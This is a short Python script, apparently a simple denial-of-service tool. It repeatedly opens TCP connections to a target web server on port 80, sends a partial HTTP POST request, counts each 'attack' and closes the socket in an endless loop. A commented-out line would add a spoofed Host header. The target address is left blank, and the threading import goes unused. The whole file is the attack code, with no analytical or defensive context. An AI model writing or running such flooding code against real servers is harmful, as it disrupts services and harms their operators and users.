import socket
import threading

target = ''
fake_ip = ''
port = 80

attack_num = 0

while True:
    s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    s.connect((target, port))
    s.sendto(("POST /" + target + " HTTP/1.1\r\n").encode('ascii'),
             (target, port))
    # s.sendto(("Host: " + fake_ip + "\r\n\r\n").encode('ascii'), (target, port))
    attack_num += 1
    print(attack_num)
    s.close()
